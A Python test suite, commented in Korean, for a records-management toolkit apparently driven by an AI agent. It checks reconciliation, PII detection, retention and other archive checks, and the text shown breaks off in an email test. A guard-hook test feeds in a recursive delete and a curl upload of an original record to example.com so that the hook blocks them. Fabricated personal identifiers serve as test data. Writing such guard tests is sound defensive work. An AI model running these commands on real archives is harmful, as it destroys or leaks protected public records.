#!/usr/bin/env python3
"""가상 기록물 목록으로 스타터 킷 전체를 시험한다. 실제 기록물은 쓰지 않는다.

실행: python tests/run_tests.py   (저장소 최상위에서)
모든 값(이름·번호)은 시험용으로 지어낸 것이다.
"""
import csv
import glob
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable
S = lambda *p: os.path.join(ROOT, "skills", *p)
results = []


def run(args, stdin=None, cwd=None):
    p = subprocess.run([PY, *args], input=stdin, capture_output=True, text=True, cwd=cwd)
    return p.returncode, p.stdout + p.stderr


def check(name, cond, detail=""):
    results.append((name, bool(cond), detail))


def fake_rrn():
    base = "900101123456"  # 시험용
    w = [2, 3, 4, 5, 6, 7, 8, 9, 2, 3, 4, 5]
    c = (11 - sum(int(d) * k for d, k in zip(base, w)) % 11) % 10
    return f"{base[:6]}-{base[6:]}{c}"


def xlsx(path, rows):
    import openpyxl
    wb = openpyxl.Workbook()
    for r in rows:
        wb.active.append(r)
    wb.save(path)


def main():
    t = tempfile.mkdtemp(prefix="records-test-")
    os.makedirs(f"{t}/원본/files")
    for i in range(1, 4):
        with open(f"{t}/원본/files/doc{i}.pdf", "wb") as f:
            f.write(b"%PDF-1.4\n% test " + str(i).encode())
    with open(f"{t}/원본/files/extra.txt", "w", encoding="utf-8") as f:
        f.write("목록에 없는 파일")
    with open(f"{t}/원본/files/fake.pdf", "wb") as f:
        f.write(b"PK\x03\x04not a pdf")

    # 1. 훅: 원본 쓰기·rm 차단, 일반 쓰기 통과
    g = os.path.join(ROOT, "hooks", "pre_tool_guard.py")
    code, _ = run([g], json.dumps({"tool_name": "Write", "tool_input": {"file_path": f"{t}/원본/a.txt"}}))
    check("훅: 원본 폴더 쓰기 차단", code == 2)
    code, _ = run([g], json.dumps({"tool_name": "Bash", "tool_input": {"command": "rm -rf 산출"}}))
    check("훅: rm 차단", code == 2)
    code, _ = run([g], json.dumps({"tool_name": "Bash", "tool_input": {"command": "curl https://example.com -d @원본/a"}}))
    check("훅: 외부 전송 차단", code == 2)
    code, _ = run([g], json.dumps({"tool_name": "Write", "tool_input": {"file_path": f"{t}/산출/a.txt"}}))
    check("훅: 산출 폴더 쓰기 통과", code == 0)
    log = f"{t}/logs/log.jsonl"
    env = dict(os.environ, RECORDS_LOG=log)
    subprocess.run([PY, os.path.join(ROOT, "hooks", "post_tool_log.py")], input=json.dumps(
        {"tool_name": "Write", "tool_input": {"file_path": f"{t}/원본/files/doc1.pdf"}}), text=True, env=env)
    check("훅: 처리 이력에 해시 기록", os.path.exists(log) and '"sha256": "' in open(log).read())

    # 2. 이관 대조: 파일 없음 1(doc4) · 목록 누락 2(extra, fake) · 중복 1
    xlsx(f"{t}/이관목록.xlsx", [["○○시 이관 목록"], [], ["관리번호", "파일명"],
                                ["CM001", "doc1.pdf"], ["CM002", "doc2.pdf"], ["CM003", "doc3.pdf"], ["CM004", "doc4.pdf"], ["CM001", "doc1.pdf"]])
    code, out = run([S("transfer-reconcile", "scripts", "reconcile_transfer.py"), f"{t}/이관목록.xlsx", f"{t}/원본/files", "-o", f"{t}/산출/이관대조.xlsx"])
    import openpyxl
    kinds = [r[0] for r in openpyxl.load_workbook(f"{t}/산출/이관대조.xlsx").worksheets[1].iter_rows(min_row=2, values_only=True)]
    check("이관 대조: 머리글 3행 자동 인식 + 불일치 보고", code == 1 and kinds.count("파일 없음") == 1 and kinds.count("목록 누락") == 2 and "목록 중복" in kinds, str(kinds))

    # 3. BagIt 만들기·검증·변조 탐지
    shutil.copytree(f"{t}/원본/files", f"{t}/ok")
    os.remove(f"{t}/ok/extra.txt")
    bag = f"{t}/산출/bag"
    code, _ = run([S("transfer-reconcile", "scripts", "make_bag.py"), f"{t}/ok", bag, "--info", "Source-Organization=시험기관"])
    code2, _ = run([S("transfer-reconcile", "scripts", "make_bag.py"), "--verify", bag])
    with open(f"{bag}/data/doc2.pdf", "ab") as f:
        f.write(b"tamper")
    code3, out3 = run([S("transfer-reconcile", "scripts", "make_bag.py"), "--verify", bag])
    check("BagIt: 생성·검증 통과·변조 탐지", code == 0 and code2 == 0 and code3 == 1, out3.strip())

    # 4. 개인정보 탐지
    with open(f"{t}/민원.txt", "w", encoding="utf-8") as f:
        f.write(f"신청인 주민등록번호 {fake_rrn()} 연락처 010-1234-5678 메일 test@example.com\n카드 4111 1111 1111 1111\n입금 계좌: 123-456-789012\n")
    code, out = run([S("pii-redact", "scripts", "pii_scan.py"), f"{t}/민원.txt", "-o", f"{t}/산출/pii.csv"])
    rows = list(csv.reader(open(f"{t}/산출/pii.csv", encoding="utf-8-sig")))[1:]
    kinds = {r[2] for r in rows}
    leaked = any("1234-5678" in ",".join(r) or fake_rrn() in ",".join(r) for r in rows)
    with open(f"{t}/민원2.txt", "w", encoding="utf-8") as f:
        f.write("여권 M12345678 면허 11-23-456789-01 사업자 220-81-62517 법인번호: 110111-2345678 군번 17-71234567 사건 2023가단12345 예시 000-00-00000\n")
    c2_, o2_ = run([S("pii-redact", "scripts", "pii_scan.py"), f"{t}/민원2.txt", "-o", f"{t}/산출/pii2.csv"])
    rows2 = list(csv.reader(open(f"{t}/산출/pii2.csv", encoding="utf-8-sig")))[1:]
    k2 = [r[2] for r in rows2]
    check("개인정보 추가 6종(2020 연구 제6호 정규식): 여권·면허·사업자(검증식)·법인·군번·사건번호, 법인/주민 중복·더미 제외",
          {"여권번호", "운전면허번호", "사업자등록번호", "법인등록번호(문맥)", "군번(문맥)", "사건번호"} <= set(k2) and "주민·외국인등록번호" not in k2
          and k2.count("사업자등록번호") == 1 and not any("2345678" in ",".join(r) for r in rows2), str(rows2))
    check("개인정보: 5종 탐지 + 결과에 원문 없음", {"주민·외국인등록번호", "휴대전화", "이메일", "카드번호", "계좌번호(문맥)"} <= kinds and not leaked, str(kinds))

    # 5. 검수 게이트: 실패 목록과 통과 목록
    head = ["관리번호", "제목", "생산기관", "생산일자", "보존기간", "공개구분", "비공개사유", "근거"]
    xlsx(f"{t}/원본목록.xlsx", [head[:4], ["CM001", "가", "○○시", "2016-03-02"], ["CM002", "나", "○○시", "2016-04-01"]])
    xlsx(f"{t}/산출/나쁜목록.xlsx", [head,
        ["CM001", "가", "○○시", "2016-03-05", "10년", "공개", "", "기준표 A-1 / 연락처 010-1234-5678"],
        ["CM002", "나", "○○시", "2016-04-01", "", "비공개", "5호", ""],
        ["CM009", "다", "○○시", "2016/4/1", "3년", "대외비", "", "기준표 B-2"]])
    code, out = run([S("records-qa-gate", "scripts", "qa_gate.py"), f"{t}/산출/나쁜목록.xlsx", "--source", f"{t}/원본목록.xlsx", "-o", f"{t}/산출/qa_bad.md"])
    md = open(f"{t}/산출/qa_bad.md", encoding="utf-8").read()
    want = ["생산일자 불일치", "원본 목록에 없음", "보존기간 빈칸", "구체 사유가 없음", "표준과 다름", "개인정보 후보", "판단 근거 빈칸", "형식 확인"]
    missing = [w for w in want if w not in md]
    check("검수 게이트: 실패 8종 모두 잡음", code == 1 and not missing, f"놓친 것: {missing}")
    xlsx(f"{t}/산출/좋은목록.xlsx", [head,
        ["CM001", "가", "○○시", "2016-03-02", "10년", "공개", "", "기준표 A-1"],
        ["CM002", "나", "○○시", "2016-04-01", "30년", "부분공개", "제6호 개인 연락처 포함(붙임 1쪽)", "기준표 A-2"]])
    shutil.rmtree(bag)
    run([S("transfer-reconcile", "scripts", "make_bag.py"), f"{t}/ok", bag])
    code, out = run([S("records-qa-gate", "scripts", "qa_gate.py"), f"{t}/산출/좋은목록.xlsx", "--source", f"{t}/원본목록.xlsx", "--manifest", f"{bag}/manifest-sha256.txt", "-o", f"{t}/산출/qa_good.md"])
    check("검수 게이트: 올바른 목록 통과", code == 0, out.strip())

    # 6. 문서번호 범위 펼치기
    xlsx(f"{t}/문서번호.xlsx", [["철관리번호", "구기록물문서번호"],
        ["F1", "기획행정담당관-351-92~94"], ["F2", "총무과-0089~0091, 총무과-1203~총무과-1205"], ["F3", "감사실-12-5"]])
    code, out = run([S("docno-extract", "scripts", "extract_docno.py"), f"{t}/문서번호.xlsx", "-o", f"{t}/산출/docno.xlsx"])
    got = [r[2] for r in openpyxl.load_workbook(f"{t}/산출/docno.xlsx").active.iter_rows(min_row=2, values_only=True)]
    want = ["기획행정담당관-351-92", "기획행정담당관-351-93", "기획행정담당관-351-94", "총무과-0089", "총무과-0090", "총무과-0091",
            "총무과-1203", "총무과-1204", "총무과-1205", "감사실-12-5"]
    check("문서번호: 범위 펼침·앞자리 0 보존", got == want, str(got))

    # 7. 무결성 기준선·대조
    run([S("fixity-check", "scripts", "fixity.py"), "baseline", f"{t}/ok", "-o", f"{t}/산출/base.csv"])
    with open(f"{t}/ok/doc3.pdf", "ab") as f:
        f.write(b"x")
    os.remove(f"{t}/ok/doc1.pdf")
    open(f"{t}/ok/new.txt", "w", encoding="utf-8").write("n")
    code, out = run([S("fixity-check", "scripts", "fixity.py"), "verify", f"{t}/ok", f"{t}/산출/base.csv", "-o", f"{t}/산출/fix.csv"])
    kinds = sorted(r[0] for r in list(csv.reader(open(f"{t}/산출/fix.csv", encoding="utf-8-sig")))[1:])
    check("무결성: 변경·사라짐·새 파일 탐지", code == 1 and kinds == ["변경", "사라짐", "새 파일"], str(kinds))

    # 8. 포맷 식별: 가짜 PDF 표시
    code, out = run([S("format-identify", "scripts", "identify.py"), f"{t}/원본/files", "-o", f"{t}/산출/fmt.csv"])
    rows = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/fmt.csv", encoding="utf-8-sig")))[1:]}
    check("포맷 식별: 확장자 불일치 표시", "PDF 아님" in rows.get("fake.pdf", [""])[-1], out.strip())
    os.makedirs(f"{t}/fmt37")
    for n_, data in (("a.hwp", b"\xd0\xcf\x11\xe0x"), ("b.hwpx", b"PK\x03\x04x"), ("c.xlsx", b"PK\x03\x04x"), ("d.pdf", b"%PDF-1.4 <pdfaid:part>1</pdfaid:part>"),
                     ("e.mkv", b"\x1aE\xdf\xa3"), ("f.csv", b"a,b"), ("g.docx", b"PK\x03\x04 ... Document SAFER")):
        open(f"{t}/fmt37/{n_}", "wb").write(data)
    run([S("format-identify", "scripts", "identify.py"), f"{t}/fmt37", "-o", f"{t}/산출/fmt37.csv"])
    r37 = {r[0]: r[6] for r in list(csv.reader(open(f"{t}/산출/fmt37.csv", encoding="utf-8-sig")))[1:]}
    check("포맷 NAK 37: 보존포맷(xlsx·csv·PDF/A-1)·수용가능(hwpx·mkv)·권고 외(hwp)",
          r37.get("c.xlsx", "").startswith("보존포맷") and r37.get("f.csv", "").startswith("보존포맷") and "PDF/A-1" in r37.get("d.pdf", "")
          and r37.get("b.hwpx", "").startswith("수용가능") and r37.get("e.mkv", "").startswith("수용가능") and r37.get("a.hwp", "").startswith("권고 외")
          and "마크애니" in {r[0]: r[-1] for r in list(csv.reader(open(f"{t}/산출/fmt37.csv", encoding="utf-8-sig")))[1:]}.get("g.docx", ""), str(r37))

    # 손상 전자기록물 1차 분류(국가기록원 2018 손상파일 복구 연구 손상 코드)
    import base64
    os.makedirs(f"{t}/dmg")
    cfb = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 22 + (9).to_bytes(2, "little") + b"\0" * 480
    for n_, data in (("tiny.hwp", b"abc"), ("note.txt", "원문서을 확인할 수 없습니다. 담당자에게 문의 바랍니다.".encode("cp949")),
                     ("b64.doc", base64.b64encode(b"x" * 120)), ("dfs.hwp", b"#Beginning_of_MetaData_Area_DestinyFS" + b"x" * 50),
                     ("cut.hwp", cfb + b"\0" * 700), ("ok.hwp", cfb + b"HWP Document File" + b"\0" * (1024 - 17)),
                     ("bad.hml", b"<HWPML><HEAD></HWPML>"), ("cut.pdf", b"%PDF-1.4 1 0 obj <<>> endobj " + b"x" * 100), ("cut.docx", b"PK\x03\x04broken" + b"\0" * 50)):
        open(f"{t}/dmg/{n_}", "wb").write(data)
    cdm, odm = run([S("format-identify", "scripts", "damage_check.py"), f"{t}/dmg", "-o", f"{t}/산출/dmg.csv"])
    dm = {}
    for r_ in list(csv.reader(open(f"{t}/산출/dmg.csv", encoding="utf-8-sig")))[1:]:
        dm.setdefault(r_[0], []).append(r_[1])
    check("손상파일 분류(2018 연구 코드): B003·S001·E001·E003·B015·B007·B002, PDF·ZIP 뒤 잘림, 정상 HWP 통과", cdm == 1
          and dm.get("tiny.hwp") == ["B003"] and dm.get("note.txt") == ["S001"] and dm.get("b64.doc") == ["E001"] and dm.get("dfs.hwp") == ["E003"]
          and dm.get("cut.hwp") == ["B015", "B007"] and "ok.hwp" not in dm and dm.get("bad.hml") == ["B002"]
          and dm.get("cut.pdf") == ["추가-PDF"] and dm.get("cut.docx") == ["추가-ZIP"], odm + str(dm))

    # 9. 비밀기록물 차단: 훅(읽기·검색)과 검수 게이트
    code, _ = run([g], json.dumps({"tool_name": "Read", "tool_input": {"file_path": f"{t}/비밀/보고서.hwp"}}))
    code2, _ = run([g], json.dumps({"tool_name": "Grep", "tool_input": {"pattern": "예산", "path": f"{t}/비밀"}}))
    code3, _ = run([g], json.dumps({"tool_name": "Read", "tool_input": {"file_path": f"{t}/산출/목록.xlsx"}}))
    check("비밀: 비밀 폴더 읽기·검색 차단, 일반 읽기 통과", code == 2 and code2 == 2 and code3 == 0)
    xlsx(f"{t}/산출/비밀포함.xlsx", [[*head, "비밀구분"],
        ["CM001", "가", "○○시", "2016-03-02", "10년", "공개", "", "기준표 A-1", "Ⅲ급"],
        ["CM002", "Ⅱ급 비밀 보고", "○○시", "2016-04-01", "30년", "부분공개", "제6호 개인 연락처 포함", "기준표 A-2", ""]])
    code, out = run([S("records-qa-gate", "scripts", "qa_gate.py"), f"{t}/산출/비밀포함.xlsx", "-o", f"{t}/산출/qa_secret.md"])
    md = open(f"{t}/산출/qa_secret.md", encoding="utf-8").read()
    check("비밀: 검수 게이트가 비밀 구분·비밀 표시 모두 차단", code == 1 and "비밀구분 = 'Ⅲ급'" in md and "Ⅱ급 비밀" in md)

    # 10. 공개 재분류 후보 (기준 연도 2026)
    rh = ["관리번호", "제목", "생산년도", "공개구분", "비공개사유", "재분류일", "비밀구분"]
    xlsx(f"{t}/비공개목록.xlsx", [rh,
        ["R1", "1990년 계획", "1990", "비공개", "제5호 의사결정 과정", "2021", ""],
        ["R2", "민원 처리부", "2010", "비공개", "제6호 개인정보 포함", "2020", ""],
        ["R3", "조사 기록", "2015", "비공개", "제4호 수사 관련 기록", "2020", ""],
        ["R4", "회의록", "2018", "비공개", "제5호", "", ""],
        ["R5", "보도자료", "2019", "공개", "", "", ""],
        ["R6", "보안 문서", "2012", "비공개", "제2호 국가안보", "2019", "Ⅱ급"],
        ["R7", "재판 기록", "2019", "부분공개", "제4호 재판 진행 중", "2023", ""],
        ["R8", "1996년 조사", "1996", "비공개", "제4호 감사 관련 조사 기록", "2024", ""]])
    code, out = run([S("disclosure-reclass", "scripts", "reclass_candidates.py"), f"{t}/비공개목록.xlsx", "--year", "2026", "-o", f"{t}/산출/reclass.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/reclass.xlsx")
    got = {ws.title: [r[0] for r in ws.iter_rows(min_row=2, values_only=True)] for ws in wb.worksheets[1:] if ws.title in
           ("30년 경과", "연장 신청 기한", "5년 주기", "6호 유예", "이력 없음", "사유 결함", "제외(비밀)")}
    rv16 = {r[0]: r for r in wb["검토서(NAK 16-1 부속서 F)"].iter_rows(min_row=2, values_only=True) if r and r[0] and str(r[0]).startswith("R")}
    want = {"30년 경과": ["R1"], "연장 신청 기한": ["R8"], "5년 주기": ["R3"], "6호 유예": ["R2"], "이력 없음": ["R4"], "사유 결함": ["R4"], "제외(비밀)": ["R6"]}
    check("공개 재분류: 7개 분류 정확(연장 신청 기한 제72조③ 포함, R5 공개·R7 주기 전 제외)", got == want, str(got))
    xlsx(f"{t}/점수목록.xlsx", [["관리번호", "제목", "생산년도", "공개구분", "비공개사유", "재분류일", "비공개확률"],
        ["S1", "가", "1990", "비공개", "제5호 의사결정 과정", "2021", "0.05"], ["S2", "나", "1990", "비공개", "제5호 의사결정 과정", "2021", "0.5"],
        ["S3", "다", "1990", "비공개", "제5호 의사결정 과정", "2021", "0.95"], ["S4", "라", "1990", "비공개", "제5호 의사결정 과정", "2021", "x"]])
    csc, osc = run([S("disclosure-reclass", "scripts", "reclass_candidates.py"), f"{t}/점수목록.xlsx", "--year", "2026", "--score-col", "비공개확률",
                    "-o", f"{t}/산출/점수.xlsx"])
    sc = {r[0]: r[-1] for r in openpyxl.load_workbook(f"{t}/산출/점수.xlsx")["30년 경과"].iter_rows(min_row=2, values_only=True)} if csc in (0, 1) else {}
    check("공개 재분류 --score-col: 0.10·0.90 검토 우선순위 구간(2025 연구 국외 사례), 점수 없음 표시",
          "공개 쪽 확실" in str(sc.get("S1")) and "검토 필요(0.50)" in str(sc.get("S2")) and "비공개 쪽 확실" in str(sc.get("S3")) and "점수 없음" in str(sc.get("S4")), osc + str(sc))
    check("공개 재분류 NAK 16-1: 검토서 16칸(심의 대상만, 비밀 제외), 기준서·체크리스트 시트",
          sorted(rv16) == ["R1", "R3", "R4", "R8"] and rv16["R1"][9] == "제5호 의사결정 과정" and rv16["R8"][16] == "연장 신청 기한"
          and "공개관리 체크리스트" in wb.sheetnames and "기준서(NAK 16-1 부속서 A)" in wb.sheetnames, str(rv16))

    # 11. 보존기간 검토 (기준 연도 2026, 가상 기준표)
    crit = S("retention-review", "assets", "sample_criteria.csv")
    xlsx(f"{t}/보존목록.xlsx", [["관리번호", "제목", "단위과제코드", "보존기간", "종료년도"],
        ["P1", "예산서", "A001", "5년", "2020"],     # 기준표 10년보다 짧음
        ["P2", "민원철", "A002", "5년", "2021"],     # 2026 만료
        ["P3", "민원철", "A002", "5년", "2019"],     # 2024 만료 지남
        ["P4", "인사철", "A004", "30년", "2014"],    # 이관연도 2020(현행 5년)·2025(개정 전 10년) → 이관 대상
        ["P5", "기타", "Z999", "7년", "2022"],       # 허용 값 아님 + 기준표에 없음
        ["P6", "계획서", "A003", "영구", "2020"],     # 2026. 8. 25. 시행 당시 기산일+5년 경과 → 부칙 제17조① 종전 10년 → 2031(아직 아님)
        ["P8", "계획서", "A003", "영구", "2021"],     # 이관연도 2027(현행 5년) → 아직
        ["P7", "민원철", "A002", "5년", "2022"]])    # 2027 내년 만료
    code, out = run([S("retention-review", "scripts", "check_retention.py"), f"{t}/보존목록.xlsx", "--criteria", crit, "--year", "2026", "-o", f"{t}/산출/ret.xlsx"])
    wb = openpyxl.load_workbook(f"{t}/산출/ret.xlsx")
    chk = {(r[0], r[5]) for r in wb["보존기간 점검"].iter_rows(min_row=2, values_only=True)}
    exp = {(r[0], r[6]) for r in wb["만료 예정"].iter_rows(min_row=2, values_only=True)}
    trn = [r[0] for r in wb["이관 대상"].iter_rows(min_row=2, values_only=True)]
    trk = {r[0]: r[6] for r in wb["이관 대상"].iter_rows(min_row=2, values_only=True)}
    ok_ret = chk == {("P1", "기준표보다 짧음"), ("P5", "허용 값 아님"), ("P5", "기준표에 없음")} and \
        {("P2", "올해 만료"), ("P3", "만료 지남"), ("P7", "내년 만료")} <= exp and sorted(trn) == ["P4"] and trk["P4"] == "이관 대상(종전)"
    xlsx(f"{t}/자체보존.xlsx", [["관리번호", "제목", "단위과제코드", "보존기간", "종료년도"],
        ["Q1", "옛 준영구", "A001", "준영구", "1950"], ["Q2", "옛 영구", "A003", "영구", "1950"], ["Q3", "30년", "A004", "30년", "1990"]])
    run([S("retention-review", "scripts", "check_retention.py"), f"{t}/자체보존.xlsx", "--criteria", crit, "--year", "2026", "--self-keep", "-o", f"{t}/산출/self26.xlsx"])
    run([S("retention-review", "scripts", "check_retention.py"), f"{t}/자체보존.xlsx", "--criteria", crit, "--year", "2028", "--self-keep", "-o", f"{t}/산출/self28.xlsx"])
    e26 = {(r[0], r[6]) for r in openpyxl.load_workbook(f"{t}/산출/self26.xlsx")["만료 예정"].iter_rows(min_row=2, values_only=True)}
    e28 = {(r[0], r[6]) for r in openpyxl.load_workbook(f"{t}/산출/self28.xlsx")["만료 예정"].iter_rows(min_row=2, values_only=True)}
    ok_ret = ok_ret and ("Q1", "70년 평가") in e26 and ("Q2", "70년 평가") not in e26 and ("Q2", "70년 평가") in e28 and ("Q3", "만료 지남") in e26
    run([S("retention-review", "scripts", "check_retention.py"), f"{t}/보존목록.xlsx", "--criteria", crit, "--year", "2026",
         "--transfer-years", "10", "-o", f"{t}/산출/ret10.xlsx"])
    trn10 = [r[0] for r in openpyxl.load_workbook(f"{t}/산출/ret10.xlsx")["이관 대상"].iter_rows(min_row=2, values_only=True)]
    ok_ret = ok_ret and trn10 == ["P4"]
    check("보존기간: 기준표 대조·만료·이관 대상(제40조① 5년·부칙 제17조① 종전 10년), 자체 보존 70년 평가(2028 영구 포함)", ok_ret, f"{chk} {exp} {trn} {trn10}")

    # 12. 스캔 품질: 정상·기울어짐·빈 면·저해상도
    from PIL import Image, ImageDraw
    os.makedirs(f"{t}/scan")
    def page(skew=0, blank=False):
        im = Image.new("L", (2480, 3508), 255)
        if not blank:
            d = ImageDraw.Draw(im)
            for y in range(300, 3200, 90):
                d.rectangle([250, y, 2200, y + 28], fill=0)
        return im.rotate(skew, fillcolor=255, expand=False) if skew else im
    page().save(f"{t}/scan/ok.tif", dpi=(300, 300))
    page(4).save(f"{t}/scan/skew.tif", dpi=(300, 300))
    page(blank=True).save(f"{t}/scan/blank.tif", dpi=(300, 300))
    page().resize((1240, 1754)).save(f"{t}/scan/lowdpi.tif", dpi=(150, 150))
    code, out = run([S("scan-qc", "scripts", "scan_qc.py"), f"{t}/scan", "-o", f"{t}/산출/scan.csv"])
    sr = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/scan.csv", encoding="utf-8-sig")))[1:]}
    ok_scan = sr["ok.tif"][-1] == "통과" and "기울기" in sr["skew.tif"][7] and abs(abs(float(sr["skew.tif"][6])) - 4) < 0.6 \
        and "빈 면" in sr["blank.tif"][7] and "DPI 150" in sr["lowdpi.tif"][7]
    ok_scan = ok_scan and sr["ok.tif"][8] == "적합"
    check("스캔 품질: 정상 통과·기울기 4°·빈 면·저해상도 탐지·마스터 포맷", ok_scan, str({k: v[6:] for k, v in sr.items()}))
    os.makedirs(f"{t}/scan26")
    a4 = page().resize((1929, 1364))
    a4.save(f"{t}/scan26/d165.tif", dpi=(165, 165))
    a4.convert("1").save(f"{t}/scan26/bw.tif", dpi=(330, 330))
    a4.save(f"{t}/scan26/q50.jpg", dpi=(330, 330), quality=50)
    a4.save(f"{t}/scan26/lzw.tif", dpi=(330, 330), compression="tiff_lzw")
    a4.save(f"{t}/scan26/p.png", dpi=(330, 330))
    c26, o26 = run([S("scan-qc", "scripts", "scan_qc.py"), f"{t}/scan26", "--kind", "문서", "--quality", "4K", "-o", f"{t}/산출/scan26.csv",
                    "--history", f"{t}/산출/hist26.csv", "--doc-purpose", "보존"])
    s26 = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/scan26.csv", encoding="utf-8-sig")))[1:]}
    h26 = list(csv.reader(open(f"{t}/산출/hist26.csv", encoding="utf-8-sig")))
    ok26 = ("DPI 165 < 330" in s26["d165.tif"][7] and "1비트" in s26["bw.tif"][7] and "50%" in s26["q50.jpg"][7] and s26["lzw.tif"][-1] == "통과"
            and s26["lzw.tif"][10] == "무손실(LZW)" and s26["p.png"][-1].startswith("포맷 확인") and "적용 기준" in h26[0] and "NAK 26 문서 4K" in h26[1][11])
    check("스캔 품질 NAK 26: 문서 4K 330ppi, 1비트 금지, JPEG 품질 70%, TIFF 압축, 포맷 목록, 디지털화 기록화 항목", ok26, o26 + str({k: v[7:] for k, v in s26.items()}))

    # 13. 폐기 심의자료: 검토 신호·부서별 의견조회·의견 칸 비움·HWPX
    xlsx(f"{t}/만료목록.xlsx", [["관리번호", "제목", "생산부서", "단위과제", "보존기간", "종료연도", "만료일", "분류"],
        ["D1", "2019년 민원 처리부", "민원과", "가상 민원처리", "5년", "2019", "2024-12-31", "만료 지남"],
        ["D2", "○○도로 보상 협의", "도로과", "가상 보상", "5년", "2021", "2026-12-31", "올해 만료"],
        ["D3", "행정소송 대응 기록", "법무팀", "가상 소송", "3년", "2023", "2026-12-31", "올해 만료"],
        ["D4", "2022년 회의 자료", "민원과", "가상 회의", "5년", "2022", "2027-12-31", "내년 만료"]])
    out_d = f"{t}/산출/평가심의"
    code, out = run([S("disposal-dossier", "scripts", "build_dossier.py"), f"{t}/만료목록.xlsx", "--year", "2026", "-o", out_d])
    ws = openpyxl.load_workbook(f"{out_d}/평가심의서.xlsx")["심의 대상"]
    body = list(ws.iter_rows(min_row=3, values_only=True))
    ids = [r[1] for r in body]
    sig = {r[1]: r[8] for r in body}
    blank = all(r[9] in (None, "") and r[11] in (None, "") and r[13] in (None, "") for r in body)
    depts = sorted(f for f in os.listdir(out_d) if f.startswith("의견조회_"))
    hw_ok = True
    try:
        if importlib.util.find_spec("hwpx") is None:
            raise ImportError("hwpx")
        import zipfile
        z = zipfile.ZipFile(f"{out_d}/심의안건.hwpx")
        x = z.read("Contents/section0.xml").decode("utf-8")
        hw_ok = "D3" in x and "심의 안건" in x
    except ImportError:
        pass
    check("폐기 심의: 대상 3건(내년 제외)·검토 신호·부서 3곳·의견 칸 비움·HWPX",
          ids == ["D1", "D2", "D3"] and "재산·권리" in sig["D2"] and "소송·분쟁" in sig["D3"] and not sig["D1"]
          and blank and len(depts) == 3 and hw_ok, f"{ids} {sig} {depts} blank={blank} hwpx={hw_ok}")

    # 14. 인수 기록 일괄 점검: 중복·위험·개인정보를 한 보고서로
    os.makedirs(f"{t}/인수")
    shutil.copy(f"{t}/원본/files/doc1.pdf", f"{t}/인수/a.pdf")
    shutil.copy(f"{t}/원본/files/doc1.pdf", f"{t}/인수/a_사본.pdf")
    shutil.copy(f"{t}/원본/files/fake.pdf", f"{t}/인수/b.pdf")
    shutil.copy(f"{t}/민원.txt", f"{t}/인수/민원.txt")
    code, out = run([S("transfer-triage", "scripts", "triage.py"), f"{t}/인수", "-o", f"{t}/산출/점검"])
    rep = open(f"{t}/산출/점검/보고서.md", encoding="utf-8").read()
    check("일괄 점검: 중복 1묶음·위험 표시·개인정보 후보 보고", "| 중복 묶음 | 1묶음" in rep and "PDF 아님" in rep and "주민·외국인등록번호" in rep, out)

    # 15. 보존포맷 변환: 텍스트·표 → PDF/A-1b, HWP는 보류, 덮어쓰지 않음 (LibreOffice 있을 때)
    if shutil.which("soffice") or shutil.which("libreoffice"):
        os.makedirs(f"{t}/변환원본")
        open(f"{t}/변환원본/회의록.txt", "w", encoding="utf-8").write("2026 test minutes\nItem 1. preservation format\n")
        open(f"{t}/변환원본/한글회의록.txt", "w", encoding="utf-8").write("2026년 시험 회의록\n안건 1. 보존포맷 변환\n")
        with open(f"{t}/변환원본/list.csv", "w", encoding="utf-8") as f:
            f.write("id,title\nCM001,a\n")
        open(f"{t}/변환원본/공문.hwp", "wb").write(b"\xd0\xcf\x11\xe0fake")
        code, out = run([S("preservation-convert", "scripts", "to_pdfa.py"), f"{t}/변환원본", f"{t}/산출/보존포맷"])
        log = {r["원본"]: r for r in csv.DictReader(open(f"{t}/산출/보존포맷/변환이력.csv", encoding="utf-8-sig"))}
        code2, out2 = run([S("preservation-convert", "scripts", "to_pdfa.py"), f"{t}/변환원본", f"{t}/산출/보존포맷"])
        log2 = {r["원본"]: r for r in csv.DictReader(open(f"{t}/산출/보존포맷/변환이력.csv", encoding="utf-8-sig"))}
        ko = log["한글회의록.txt"]
        ko_ok = ko["판정"] == "통과" or (ko["글꼴"].startswith("CharSet 없음") and "TrueType 한글 글꼴" in ko["비고"])
        ok_pa = log["회의록.txt"]["판정"] == "통과" and log["회의록.txt"]["PDF/A 선언"] == "PDF/A-1b" and ("날짜 맞춤" in log["회의록.txt"]["비고"] or not log["회의록.txt"]["비고"]) \
            and log["list.csv"]["판정"] == "통과" and log["공문.hwp"]["판정"] == "보류" and log2["회의록.txt"]["판정"] == "건너뜀" and ko_ok
        check("보존포맷: PDF/A-1b 변환·날짜 맞춤(6.7.3)·OTF 한글 대체 글꼴 CharSet 경고(6.3.5)·HWP 보류·덮어쓰기 안 함", ok_pa,
              str({k: (v["판정"], v["PDF/A 선언"], v["글꼴"], v["비고"]) for k, v in log.items()}))
        if shutil.which("verapdf"):
            code3, out3 = run([S("preservation-convert", "scripts", "to_pdfa.py"), f"{t}/변환원본", f"{t}/산출/보존포맷_vera", "--verapdf"])
            lv = {r["원본"]: r for r in csv.DictReader(open(f"{t}/산출/보존포맷_vera/변환이력.csv", encoding="utf-8-sig"))}
            check("보존포맷 veraPDF: 영문 회의록 적합·한글 파일명도 검증됨(검증 오류 아님)",
                  lv["회의록.txt"]["veraPDF"] == "적합" and not lv["한글회의록.txt"]["veraPDF"].startswith("검증 오류"), str({k: v["veraPDF"] for k, v in lv.items()}))
    else:
        check("보존포맷: LibreOffice 없음 — 건너뜀(통과로 치지 않음)", False, "LibreOffice 미설치")

    # 16. 이메일 평가: MBOX 3통 — 첨부·개인정보·비밀 표시, 본문은 결과에 없음
    import mailbox as _mb
    from email.message import EmailMessage
    box = _mb.mbox(f"{t}/보관함.mbox")
    def mk(frm, to, subj, body, date, att=None):
        m = EmailMessage()
        m["From"], m["To"], m["Subject"], m["Date"] = frm, to, subj, date
        m["Message-ID"] = f"<{abs(hash(subj))}@test>"
        m.set_content(body)
        if att:
            m.add_attachment(att, maintype="application", subtype="pdf", filename="붙임.pdf")
        box.add(m)
    mk("kim@test.go.kr", "lee@test.go.kr", "2026년 예산 협의", "예산안 검토 부탁드립니다.", "Mon, 02 Mar 2026 09:00:00 +0900", b"%PDF-1.4 test")
